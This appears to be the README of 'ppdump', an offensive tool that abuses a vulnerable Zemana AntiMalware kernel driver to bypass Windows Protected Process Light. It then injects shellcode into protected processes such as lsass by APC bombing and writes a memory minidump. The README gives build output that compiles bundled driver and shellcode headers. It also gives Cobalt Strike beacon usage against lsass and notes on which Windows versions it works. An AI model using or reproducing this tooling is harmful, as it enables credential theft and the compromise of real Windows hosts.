## About

The bug that I abuse  goes to [@Dark_Puzzle](https://twitter.com/Dark_Puzzle) whom disclosed [here](http://rce4fun.blogspot.com/2018/02/malwarefox-antimalware-zam64sys.html) the privileged registration with Zemana AntiMalware. I only expanded upon this to use an additional IOCTL to open a thread with FULL_ACCESS (but still with some limitations!).

Protected Process (Light) on the latest iterations of Microsoft Windows has become the bane of most attackers - it prevents tools such as Mimikatz from obtaining a privileged handle to critical processes such as lsass, winlogon, and crss, all of which control the Microsoft kernel in various ways. As such, I studied various means of attacking the kernel and discovered one particular way which succeeded - using a stolen kernel driver to open a privileged handle the process and its underlying threads.

Using these privileged handles, I was able to successfully "APC Bomb" each individual threads until it reached an altertable state by using QueueUserAPC, and Stomping / Resuming the threads a multitude of times. 

### Versions Tested
  - Windows 10 1909 x64 (SUCCESS!)
  - Windows 10 1903 x64 (SUCCESS!)
  - Server 2012 (FAILURE: Output successful, yet minidump doesnt exist. weird. TODO)

### Build

The ppdump module can be built using `Make` and `Mingw-W64`. Simply download the make build system using your favorite package manager, as well the Mingw compiler package, and then run `make`. 

```sh 
$ make
make -f Makefile.x64
make[1]: Entering directory '/home/austin/projects/ppdump-public'
cp -rf src/drvs/zam.x64.h src/zam.x64.h
cp -rf src/shellcode/payload.x64.h src/payload.x64.h
x86_64-w64-mingw32-gcc -shared -s -ldbghelp -lntdll src/*.c src/ldr/*.c -o ppdump.x64.dll
make[1]: Leaving directory '/home/austin/projects/ppdump-public'
make -f Makefile.x86
make[1]: Entering directory '/home/austin/projects/ppdump-public'
cp -rf src/drvs/zam.x86.h src/zam.x86.h
cp -rf src/shellcode/payload.x86.h src/payload.x86.h
i686-w64-mingw32-gcc -shared -s -ldbghelp -lntdll src/*.c src/ldr/*.c -o ppdump.x86.dll
make[1]: Leaving directory '/home/austin/projects/ppdump-public
$ file ppdump.x64.dll ppdump.x64.dll
```

### Usage

Firstly, load the provided Cobalt Strike Aggresor Script into your script resource / console. Afterwards, using `ppdump` command with the provided PID (Process ID) of the target process - pass `ppdump <pid>`, which will kick off the Reflective Module loading process, and then start initializing the driver. A successful run with the process ID of Lsa should result in the following.

```
beacon> ppdump 820
[ ] driver will be stored in C:\WINDOWS\TEMP\tiGr4.sys
[ ] minidump will be stored in C:\WINDOWS\TEMP\usaxb.dmp

## Bugs
**NOTE**: Please do not run multiple instances of the ppdump command - wait until one has completed before running another. This is because only one driver can be loaded at a time - so if two are loaded at the same time, the process tends to break quiet quickly. Furthermore some of the threads will lock up during the injection process if you run too many of the DLL at the same time.
